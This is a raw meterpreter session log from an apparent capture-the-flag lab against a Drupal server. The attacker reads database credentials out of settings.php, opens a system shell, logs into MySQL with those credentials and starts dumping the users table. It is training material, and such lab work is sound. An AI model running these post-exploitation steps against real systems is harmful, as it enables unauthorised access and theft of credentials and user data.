100644/rw-r--r--  3092376453840   fil   188498731153-02-08 21:33:43 -0500  cron.php
100644/rw-r--r--  223338299444    fil   211037522224-07-25 00:21:02 -0400  flag1.txt
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  includes
100644/rw-r--r--  2272037700113   fil   188498731153-02-08 21:33:43 -0500  index.php
100644/rw-r--r--  3019362009791   fil   188498731153-02-08 21:33:43 -0500  install.php
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  misc
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  modules
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  profiles
100644/rw-r--r--  6704443950617   fil   188498731153-02-08 21:33:43 -0500  robots.txt
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  scripts
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  sites
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  themes
100644/rw-r--r--  85645942869477  fil   188498731153-02-08 21:33:43 -0500  update.php
100644/rw-r--r--  9354438772866   fil   188498731153-02-08 21:33:43 -0500  web.config
100644/rw-r--r--  1791001362849   fil   188498731153-02-08 21:33:43 -0500  xmlrpc.php

meterpreter > cd sites
meterpreter > ls
Listing: /var/www/sites
=======================

Mode              Size            Type  Last modified                      Name
----              ----            ----  -------------                      ----
100644/rw-r--r--  3882650436488   fil   188498731153-02-08 21:33:43 -0500  README.txt
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  all
040555/r-xr-xr-x  17592186048512  dir   211037744751-06-28 21:04:17 -0400  default
100644/rw-r--r--  10157597657405  fil   188498731153-02-08 21:33:43 -0500  example.sites.php

meterpreter > cd default
meterpreter > ls
Listing: /var/www/sites/default
===============================

Mode              Size            Type  Last modified                      Name
----              ----            ----  -------------                      ----
100644/rw-r--r--  99651831224994  fil   188498731153-02-08 21:33:43 -0500  default.settings.php
040775/rwxrwxr-x  17592186048512  dir   211037438521-10-10 04:26:47 -0400  files
100444/r--r--r--  68672232111733  fil   211037744751-06-28 21:04:17 -0400  settings.php

meterpreter > cat settings.php
<?php

/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);


eterpreter > sql
[-] Unknown command: sql. Run the help command for more details.
meterpreter > mysql
[-] Unknown command: mysql. Run the help command for more details.
meterpreter > bash
[-] Unknown command: bash. Run the help command for more details.
meterpreter > sh
[-] Unknown command: sh. Run the help command for more details.
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    chmod                     Change the permissions of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    shell                     Drop into a system command shell
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system

For more info on a specific command, use <command> -h or help <command>.

meterpreter > shell
Process 3236 created.
Channel 2 created.
ls
default.settings.php
files
settings.php
mysql
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: NO)
mysql -u dbuser -p R0ck3t
Enter password: R0ck3t
ERROR 1044 (42000): Access denied for user 'dbuser'@'localhost' to database 'R0ck3t'
mysql -u dbuser -p drupaldb 
Enter password: R0ck3t
show tables;
use
ERROR at line 2: USE must be followed by a database name
use drupaldb;
show databases;
exit
Tables_in_drupaldb
actions
authmap
batch
block
block_custom
block_node_type
block_role
blocked_ips
cache
cache_block
cache_bootstrap
cache_field
cache_filter
cache_form
cache_image
cache_menu
cache_page
cache_path
cache_update
cache_views
cache_views_data
comment
ctools_css_cache
ctools_object_cache
date_format_locale
date_format_type
date_formats
field_config
field_config_instance
field_data_body
field_data_comment_body
field_data_field_image
field_data_field_tags
field_revision_body
field_revision_comment_body
field_revision_field_image
field_revision_field_tags
file_managed
file_usage
filter
filter_format
flood
history
image_effects
image_styles
menu_custom
menu_links
menu_router
node
node_access
node_comment_statistics
node_revision
node_type
queue
rdf_mapping
registry
registry_file
role
role_permission
search_dataset
search_index
search_node_links
search_total
semaphore
sequences
sessions
shortcut_set
shortcut_set_users
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
variable
views_display
views_view
watchdog
Database
information_schema
drupaldb
select * from users;
/bin/sh: 5: select: not found
mysql -u dbuser -p drupaldb
Enter password: R0ck3t
use drupaldb;
select * from users;



```